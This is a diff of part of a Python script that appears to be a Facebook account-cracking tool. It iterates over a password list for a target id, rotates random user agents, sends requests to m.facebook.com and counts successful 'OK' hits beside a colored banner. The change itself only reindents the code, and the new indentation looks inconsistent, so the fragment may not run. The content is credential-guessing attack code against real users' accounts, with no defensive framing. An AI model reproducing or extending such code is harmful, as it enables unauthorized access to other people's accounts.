@@ -1185,13 +1185,13 @@ def m3(idf,pwv):
 async def main():
  await king_xd.submit(m4, idf, pwv)
  global loop
-  global ok
-  global agents
-  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-  sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
-  async with aiohttp.ClientSession() as session:
-   try:
-    for ps in pwv:
+ global ok
+ global agents
+ animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+ sys.stdout.write(f'\r{P} [{animasi}{N}-{H}M4{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+ async with aiohttp.ClientSession() as session:
+  try:
+   for ps in pwv:
      ua = random.choice(usragent)
      free_fb = await session.get('https://m.facebook.com')
      free_fb_text = await free_fb.text()
@@ -1242,7 +1242,7 @@ async def main():
      else:
        continue
      await asyncio.sleep(0.1)
-    loop+=1
+   loop+=1
   
   except aiohttp.ClientError as e:
      print(f"An error occurred: {e}")
